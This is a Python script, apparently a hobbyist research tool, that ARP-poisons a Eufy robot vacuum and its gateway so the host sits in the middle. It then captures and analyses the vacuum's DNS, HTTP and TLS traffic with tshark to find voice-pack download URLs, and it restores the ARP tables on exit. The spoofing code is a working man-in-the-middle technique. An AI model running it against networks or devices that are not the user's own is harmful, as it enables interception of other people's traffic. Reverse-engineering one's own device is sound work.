#!/usr/bin/env python3
"""
capture_vacuum_traffic.py — Research tool: ARP spoof the Eufy vacuum to
intercept and capture its download traffic.

FOR USE ON DEVICES YOU OWN ONLY.

ARP-poisons the vacuum and its gateway so this machine sits in the middle,
then runs tshark to capture all traffic. Restores ARP tables on exit.

Useful for:
  - Capturing the voice pack download URL and ZIP (HTTP)
  - Identifying what cloud servers the vacuum contacts (HTTPS TLS SNI)
  - Reverse-engineering new DPS values

Requires: scapy, tshark
    pip install scapy
    apt install tshark

Usage: sudo python3 tools/capture_vacuum_traffic.py
Then change voice language in the Eufy app to trigger a download.
Ctrl+C to stop and analyze.
"""

import sys, os, time, threading, signal, subprocess

VACUUM_IP  = "10.0.0.253"
GATEWAY_IP = "10.0.0.1"
IFACE      = "eno1"
PCAP_FILE  = "/tmp/vacuum_capture.pcapng"

print("[*] Resolving MACs...")
from scapy.all import srp, Ether, ARP, get_if_hwaddr, sendp

OUR_MAC = get_if_hwaddr(IFACE)
print(f"    Our MAC:     {OUR_MAC}")

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, iface=IFACE, verbose=False)
    return ans[0][1].hwsrc if ans else None

VACUUM_MAC = get_mac(VACUUM_IP)
if not VACUUM_MAC:
    sys.exit(f"[!] Cannot find {VACUUM_IP}")
print(f"    Vacuum MAC:  {VACUUM_MAC}")

GATEWAY_MAC = get_mac(GATEWAY_IP)
if not GATEWAY_MAC:
    sys.exit(f"[!] Cannot find {GATEWAY_IP}")
print(f"    Gateway MAC: {GATEWAY_MAC}")

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -I FORWARD -p icmp --icmp-type redirect -j DROP 2>/dev/null")
print("[*] IP forwarding on, ICMP redirects blocked")

stop_event = threading.Event()

def arp_poison():
    pkt_v = Ether(dst=VACUUM_MAC) / ARP(op=2,
        pdst=VACUUM_IP, hwdst=VACUUM_MAC, psrc=GATEWAY_IP, hwsrc=OUR_MAC)
    pkt_g = Ether(dst=GATEWAY_MAC) / ARP(op=2,
        pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=VACUUM_IP, hwsrc=OUR_MAC)
    while not stop_event.is_set():
        sendp(pkt_v, iface=IFACE, verbose=False)
        sendp(pkt_g, iface=IFACE, verbose=False)
        time.sleep(1.5)

def restore_arp():
    print("[*] Restoring ARP...")
    pkt_v = Ether(dst=VACUUM_MAC) / ARP(op=2,
        pdst=VACUUM_IP, hwdst=VACUUM_MAC, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
    pkt_g = Ether(dst=GATEWAY_MAC) / ARP(op=2,
        pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=VACUUM_IP, hwsrc=VACUUM_MAC)
    for _ in range(5):
        sendp(pkt_v, iface=IFACE, verbose=False)
        sendp(pkt_g, iface=IFACE, verbose=False)
        time.sleep(0.3)

# ── tshark ──────────────────────────────────────────────────────────────────
if os.path.exists(PCAP_FILE):
    os.remove(PCAP_FILE)

tshark_proc = subprocess.Popen(
    ["tshark", "-i", IFACE, "-f", f"host {VACUUM_IP}", "-w", PCAP_FILE, "-q"],
    stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
)
time.sleep(1.5)
if tshark_proc.poll() is not None:
    err = tshark_proc.stderr.read().decode(errors='replace')
    os.system("iptables -D FORWARD -p icmp --icmp-type redirect -j DROP 2>/dev/null")
    sys.exit(f"[!] tshark failed to start:\n{err}")
print(f"[*] tshark running (pid {tshark_proc.pid})")

# ── analysis ─────────────────────────────────────────────────────────────────
def analyze_capture():
    print(f"\n{'='*60}\nANALYSIS\n{'='*60}")
    if not os.path.exists(PCAP_FILE):
        print("[!] No pcap file"); return
    size = os.path.getsize(PCAP_FILE)
    print(f"pcap: {size:,} bytes")
    if size < 200:
        print("[!] pcap is empty - tshark didn't capture anything"); return

    def tshark(args):
        r = subprocess.run(["tshark", "-r", PCAP_FILE] + args,
                           capture_output=True, text=True)
        return r.stdout.strip()

    print("\n[DNS from vacuum]")
    out = tshark(["-Y", f"ip.src=={VACUUM_IP} && dns.flags.response==0",
                  "-T", "fields", "-e", "dns.qry.name"])
    seen = set()
    for q in out.split('\n'):
        if q.strip() and q.strip() not in seen:
            seen.add(q.strip()); print(f"  {q.strip()}")
    if not seen: print("  (none - DNS bypassing us)")

    print("\n[TCP connections from vacuum]")
    out = tshark(["-Y", f"ip.src=={VACUUM_IP} && tcp.flags.syn==1 && tcp.flags.ack==0",
                  "-T", "fields", "-e", "ip.dst", "-e", "tcp.dstport"])
    conns = set()
    for line in out.split('\n'):
        p = line.split('\t')
        if len(p) >= 2 and p[0]:
            k = f"{p[0]}:{p[1]}"
            if k not in conns:
                conns.add(k)
                proto = "HTTPS" if p[1] == "443" else ("HTTP" if p[1] == "80" else f"port {p[1]}")
                print(f"  {p[0]}:{p[1]} ({proto})")
    if not conns: print("  (none - ICMP redirect still blocking?)")

    print("\n[HTTP requests from vacuum]")
    out = tshark(["-Y", f"ip.src=={VACUUM_IP} && http.request",
                  "-T", "fields", "-e", "http.request.method",
                  "-e", "http.host", "-e", "http.request.uri"])
    if out:
        for line in out.split('\n'):
            p = line.split('\t')
            if len(p) >= 3: print(f"  {p[0]} http://{p[1]}{p[2]}")
    else:
        print("  (none on port 80)")

    print("\n[HTTPS connections (TLS SNI)]")
    out = tshark(["-Y", f"ip.src=={VACUUM_IP} && tls.handshake.type==1",
                  "-T", "fields", "-e", "ip.dst", "-e", "tcp.dstport",
                  "-e", "tls.handshake.extensions_server_name"])
    seen = set()
    for line in out.split('\n'):
        p = line.split('\t')
        if len(p) >= 3 and p[2]:
            k = f"{p[2]}:{p[1]}"
            if k not in seen:
                seen.add(k); print(f"  https://{p[2]}:{p[1]}  ({p[0]})")
    if not seen: print("  (none)")

    # HTTP object export
    http_dir = "/tmp/vacuum_http_objects"
    os.makedirs(http_dir, exist_ok=True)
    subprocess.run(["tshark", "-r", PCAP_FILE,
                    "--export-objects", f"http,{http_dir}"], capture_output=True)
    files = [f for f in os.listdir(http_dir)]
    if files:
        print(f"\n[HTTP objects -> {http_dir}/]")
        for f in files:
            fp = os.path.join(http_dir, f)
            print(f"  {f}  ({os.path.getsize(fp):,} bytes)")
            r = subprocess.run(["file", fp], capture_output=True, text=True)
            print(f"    -> {r.stdout.split(':', 1)[1].strip()}")

    os.system(f"chmod 644 {PCAP_FILE}")
    print(f"\n[*] Full pcap: {PCAP_FILE}")

def signal_handler(sig, frame):
    stop_event.set()
    print("\n[*] Stopping...")
    tshark_proc.terminate()
    time.sleep(1.5)
    os.system("iptables -D FORWARD -p icmp --icmp-type redirect -j DROP 2>/dev/null")
    restore_arp()
    analyze_capture()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

threading.Thread(target=arp_poison, daemon=True).start()

print(f"\n{'='*60}")
print("READY. In the Eufy app:")
print("  1. L50 settings -> Voice Pack")
print("  2. Switch to a DIFFERENT language")
print("  3. Wait ~30s for the download to happen")
print("  4. Ctrl+C here to analyze")
print("=" * 60 + "\n")

try:
    while True:
        time.sleep(5)
        sz = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0
        print(f"[.] {time.strftime('%H:%M:%S')}  pcap={sz:,}b", flush=True)
except KeyboardInterrupt:
    signal_handler(None, None)
